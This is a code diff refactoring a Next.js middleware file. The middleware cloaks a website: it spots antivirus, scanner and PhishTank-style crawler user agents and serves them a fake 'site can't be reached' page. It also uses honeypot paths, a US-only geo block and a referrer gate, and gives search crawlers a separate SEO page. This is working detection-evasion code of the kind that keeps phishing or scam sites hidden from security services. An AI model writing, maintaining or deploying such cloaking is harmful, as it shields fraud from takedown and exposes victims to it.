@@ -69,25 +69,19 @@ var SEARCH_REFERRERS = /google\.|bing\.|yahoo\.|duckduckgo\.|baidu\.|yandex\.|ec
 
 
 
-import { NextResponse } from "next/server";
-
-export function middleware(request) {
+export async function middleware(request) {
   var url = new URL(request.url);
   var pathname = url.pathname;
   var ua = request.headers.get('user-agent') || '';
 
-  // API requests: pass through with security headers
+  // API requests: pass through to the API handler
   if (pathname.startsWith('/api/')) {
-    var response = NextResponse.next();
-    for (var key in SECURITY_HEADERS) {
-      response.headers.set(key, SECURITY_HEADERS[key]);
-    }
-    return response;
+    return null;
   }
 
   // Honeypot paths: fake "site can't be reached" error page
   if (HONEYPOT_PATHS[pathname]) {
-    return new NextResponse(buildErrorPage(url.hostname), {
+    return new Response(buildErrorPage(url.hostname), {
       status: 200,
       headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
     });
@@ -95,7 +89,7 @@ export function middleware(request) {
 
   // Block scanners / antivirus / PhishTank-style crawlers / bots
   if (isBlockedBot(ua)) {
-    return new NextResponse(buildErrorPage(url.hostname), {
+    return new Response(buildErrorPage(url.hostname), {
       status: 200,
       headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' },
     });
@@ -118,7 +112,7 @@ export function middleware(request) {
         var seoResp = await fetch(seoUrl);
         if (seoResp.ok) {
           var html = await seoResp.text();
-          var seoRes = new NextResponse(html, {
+          var seoRes = new Response(html, {
             status: 200,
             headers: { 'Content-Type': 'text/html; charset=utf-8' },
           });
@@ -133,7 +127,7 @@ export function middleware(request) {
     if (!isTrustedCrawler) {
       // US-only geo restriction
       if (country && country !== 'US') {
-        return new NextResponse(buildErrorPage(url.hostname), {
+        return new Response(buildErrorPage(url.hostname), {
           status: 200,
           headers: { 'Content-Type': 'text/html; charset=utf-8' },
         });
@@ -142,7 +136,7 @@ export function middleware(request) {
       var referrerGateOn = String(process.env.GATE_REFERRER || 'on').toLowerCase() !== 'off';
       var isDirect = !referer;
       if (referrerGateOn && !isDirect && !isFromSearch && !isInternal) {
-        return new NextResponse(buildErrorPage(url.hostname), {
+        return new Response(buildErrorPage(url.hostname), {
           status: 200,
           headers: { 'Content-Type': 'text/html; charset=utf-8' },
         });
@@ -150,15 +144,11 @@ export function middleware(request) {
     }
   }
 
-  var finalRes = NextResponse.next();
-  for (var key3 in SECURITY_HEADERS) {
-    finalRes.headers.set(key3, SECURITY_HEADERS[key3]);
-  }
-  return finalRes;
+  return null;
 }
 
 export const config = {
   matcher: [
-    '/((?!_next/static|_next/image|favicon.ico|seo.html).*)',
+    '/((?!_next/static|_next/image|favicon.ico|seo.html|robots.txt|sitemap.xml).*)',
   ],
 };
